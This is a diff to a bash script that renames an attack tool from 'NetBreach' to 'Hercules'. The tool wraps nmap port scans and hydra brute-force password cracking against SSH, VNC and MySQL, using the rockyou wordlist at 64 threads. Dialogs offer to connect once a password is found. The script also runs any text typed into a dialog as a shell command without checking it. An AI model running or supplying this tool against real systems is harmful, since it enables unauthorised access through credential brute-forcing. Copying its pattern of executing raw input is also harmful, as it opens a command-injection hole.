@@ -2,7 +2,7 @@
 source DontEdit.sh
 
 #checks if the user is connected to ssh and if they are it makes the program not work
-if [ -n "$SSH_CLIENT" ]; then
+if [ -n "${SSH_CLIENT}" ]; then
     echo "Connected via SSH"
     exit 1
 else
@@ -10,16 +10,35 @@ else
 fi
 
 # Function to handle cleanup on exit
-cleanup() {
+# quits program with ctrl-c
+EXIT_PROGRAM_WITH_CTRL_C() {
     echo -e "${RED}[-]${NC} EXITING SOFTWARE..."
     # Add cleanup commands here
     exit 1
 }
 
+# quits program with ctrl-z
+EXIT_PROGRAM_WITH_CTRL_Z(){
+    echo ""
+    echo -e "${RED}[-]${NC} EXITING SOFTWARE..."
+    # Add cleanup commands here
+    exit 1
+}
+
+# Function to be executed when Ctrl+Z is pressed
+handle_ctrl_z() {
+    EXIT_PROGRAM_WITH_CTRL_Z
+    exit 1
+    # Your custom action goes here
+}
+
+# Set up the trap to call the function on SIGTSTP (Ctrl+Z)
+trap 'handle_ctrl_z' SIGTSTP
+
 # Function to handle Ctrl+C
 ctrl_c() {
     echo ""
-    cleanup
+    EXIT_PROGRAM_WITH_CTRL_C
 }
 
 trap ctrl_c SIGINT
@@ -34,10 +53,24 @@ command_exists() {
     command -v "$1" >/dev/null 2>&1
 }
 
-# Check if required packages are installed
+# Check for required packages
 for package in "${required_packages[@]}"; do
-    if ! command_exists "${package}"; then
-        echo -e "ERROR: The required package ${RED}'${package}'${NC} is not installed. Please install it and try again."
+    if ! command_exists "$package"; then
+        echo -e "[ ${RED}FAIL${NC} ] The required package ${GREEN}'${package}'${NC} is not installed. Please install it and try again."
+        sleep 1 
+
+        #asks the user if they want to install the packages that are mssing
+        echo "Would you like me to install it for you. YES/NO"
+
+        read -p ">>> " install
+        
+        if [[ " ${yes[*]} " == *" ${install} "* ]]; then
+            bash requirements.sh
+            exit 1
+        else
+            echo "Ok stopping program"
+            exit 1
+        fi
         exit 1
     fi
 done
@@ -53,21 +86,21 @@ else
     if [[ "$OSTYPE" == "${OS}"* ]]; then
 
         # Function to scan ports
-        NetBreach() {
-            figlet -f slant "NetBreach"
+        Hercules() {
+            figlet -f slant "Hercules"
             options_text="Type the number of the port you want to scan (SSH - 22, VNC - 5900, MySQL - 3306). To scan all, type 'ALL'.\nIf you want to stop the program, type 'stop'."
-            service=$(zenity --entry --title "NetBreach" --text "$options_text" --entry-text "")
+            service=$(zenity --entry --title "Hercules" --text "$options_text" --entry-text "")
             
             if [[  " ${exit[*]} " == *" ${service} "* ]]; then
                 echo 
             else
                 echo -e "[+] The port you are scanning is: ${service}"
             fi
-
-            if [[ "${service}" == "ALL" || "${service}" == "all" ]]; then
+            
+            if [[ "${service}" == "ALL" || "${service}" == "all" || "${service}" == "*" ]]; then
                 echo -e "[-] Exiting program..."
                 # Scan all ports
-                zenity --info --title "NetBreach" --text "Scanning all ports. This may take up to 1 hour to complete." --timeout=5
+                zenity --info --title "Hercules" --text "Scanning all ports. This may take up to 1 hour to complete." --timeout=5
                 sudo nmap 127.0.0.1/24 -Pn -oN scan.txt --open
 
                 zenity --info --title "INFO" --text "Put in Hydra first to start the script." --timeout=5
@@ -75,20 +108,20 @@ else
                 GUI_HYDRA=$(zenity --entry --title "hydra" --text "$hydraInputField" --entry-text "")
 
                 if [[ " ${exit[*]} " == *" ${GUI_HYDRA} "* ]]; then
-                    zenity --info --title "NetBreach" --text "Stopping program."
+                    zenity --info --title "Hercules" --text "Stopping program."
                     exit 1
                 else
                     $GUI_HYDRA
                     exit 1
                 fi
             elif [[ " ${exit[*]} " == *" ${service} "* ]]; then
-                zenity --info --title "NetBreach" --text "Stopping program."
+                zenity --info --title "Hercules" --text "Stopping program."
                 exit 1
             elif [[ "${service}" == "" ]]; then
                 zenity --error --title "ERROR" --text "Please input a number into the input field."
-                NetBreach
+                Hercules
             else
-                zenity --info --title "NetBreach" --text "Scanning port ${service}." --timeout=5
+                zenity --info --title "Hercules" --text "Scanning port ${service}." --timeout=5
                 nmap 127.0.0.1 -p "${service}" --open
             fi
         }
@@ -119,7 +152,7 @@ else
             if [[ $service == 5900 || $service == "VNC" ]]; then
                 if [[ $user == "" && $host == "" || $host == "" ]]; then
                     zenity --info --title="SERVICE" --text="No service specified"
-                    NetBreach
+                    Hercules
                 else
                     # Crack VNC password
                     hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://"$host"
@@ -130,7 +163,7 @@ else
                     title="Enter password to ${host}"
                     Connected_To_VNC_SERVER="Connected to '${host}'. Enter the password to continue..."
                     zenity --info --title="${title}" --text="${Connected_To_VNC_SERVER}"
-                    open "vncviewer://${host}"
+                    open "vnc://${host}"
                     exit 1
                 fi
             fi
@@ -141,10 +174,10 @@ else
             if [[ $service == 22 || $service == "SSH" ]]; then
                 if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                     zenity --info --title="SERVICE" --text="No service specified"
-                    NetBreach
+                    Hercules
                 else
                     # Crack SSH password
-                    hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I ssh://"${host}"
+                    hydra -l "$user" -P rockyou.txt -t 64 -vV -o output.log -I ssh://"$host"
                     title="Connecting to ${user}"
                     Connecting_To_SSH_SERVER="Connecting to ${user}. Please wait..."
                     zenity --info --title="${title}" --text="${Connecting_To_SSH_SERVER}"
@@ -162,10 +195,10 @@ else
             if [[ $service == 3306 || $service == "mysql" ]]; then
                 if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                     zenity --info --title="SERVICE" --text="No service specified"
-                    NetBreach
+                    Hercules
                 else
                     # Crack MySQL password
-                    hydra -l "$userName" -P rockyou.txt -t 64 -vV -o output.log -I mysql://"${hostName}"
+                    hydra -l "$userName" -P rockyou.txt -t 64 -vV -o output.log -I mysql://"$hostName"
                     title="Connecting to ${user}"
                     Connecting_To_MySQL_SERVER="Connecting to ${host}. Please wait..."
                     zenity --info --title="${title}" --text="${Connecting_To_MySQL_SERVER}"
@@ -176,7 +209,7 @@ else
         }
 
         # Call functions in order
-        NetBreach
+        Hercules
         RunHackingCommand
         RunHackingCommandWithVNC
         RunHackingCommandWithSSH
